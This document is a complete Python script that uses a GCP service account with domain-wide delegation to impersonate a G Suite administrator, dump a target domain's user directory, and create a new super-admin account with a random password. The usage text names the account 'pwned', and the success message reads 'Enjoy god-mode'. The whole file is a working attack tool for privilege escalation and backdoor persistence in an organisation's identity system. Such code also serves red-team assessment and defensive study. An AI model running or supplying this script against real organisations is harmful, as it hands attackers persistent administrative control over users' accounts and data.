#!/usr/bin/env python3

"""
Creates a new super-user account in G Suite by leveraging a GCP service account
that has been enabled for domain-wide delegation

More info here:
  https://developers.google.com/admin-sdk/directory/v1/guides/delegation

Usage:

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --account pwned
"""


import sys
import os
import json
import random
import string
import argparse
from googleapiclient.discovery import build
from oauth2client.service_account import ServiceAccountCredentials


def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('--keyfile', '-k', type=str, action='store',
                        required=True,
                        help='GCP service account credentials JSON file')
    parser.add_argument('--impersonate', '-i', type=str, action='store',
                        required=True,
                        help='G Suite email address to impersonate')
    parser.add_argument('--domain', '-d', type=str, action='store',
                        required=True,
                        help='G Suite domain to run commands against')
    parser.add_argument('--account', '-a', type=str, action='store',
                        help='Admin email address to create')
    parser.add_argument('--list', '-l', action='store_true',
                        help='List user directory')

    args = parser.parse_args()

    # Before moving on, validate all the input data is present
    if not os.path.isfile(args.keyfile):
        print("[!] That keyfile not exist. Please try again.")
        sys.exit()

    return args

def create_directory_service(keyfile, impersonate):
    """
    Google-provided function to return active G Suite credentials object
    """
    credentials = ServiceAccountCredentials.from_json_keyfile_name(keyfile,
        scopes=['https://www.googleapis.com/auth/admin.directory.user',])

    credentials = credentials.create_delegated(impersonate)

    return build('admin', 'directory_v1', credentials=credentials)

def validate_access(service, domain):
    """
    Attempt to query the user directory in order to validate access
    """
    print("[*] Validating access...")

    try:
        directory = service.users().list(domain=domain).execute()
        formatted = json.dumps(directory, indent=4, sort_keys=True)
        print("[+] We have access!")
        return formatted
    except Exception as e:
        print("[!] API failure... here are the details:")
        print(e)
        sys.exit()

def create_user(service, account):
    """
    Creates a user account, API will return auto-generated password
    """
    print("[*] Attempting to create new user {}..."
          .format(account))
    password = ''.join(random.SystemRandom()
                       .choice(string.ascii_uppercase + string.digits)
                       for _ in range(12))
    body = {'primaryEmail': account,
            'name': {'givenName': 'GSuite', 'familyName': 'API-Admin'},
            'password': password}

    service.users().insert(body=body).execute()
    print("[+] Created user with password: {}".format(password))

    print("[*] Attempting to make user an admin...")
    service.users().makeAdmin(userKey=account,
                              body={'status': True}).execute()
    print("[+] Success! Enjoy god-mode.")

def main():
    """
    Either returns the G Suite directory or creates a new user, depending
    on arguments provided.
    """
    args = process_args()
    service = create_directory_service(args.keyfile, args.impersonate)

    directory = validate_access(service, args.domain)

    if args.list:
        print(directory)

    if args.account:
        create_user(service, args.account)


if __name__ == '__main__':
    main()
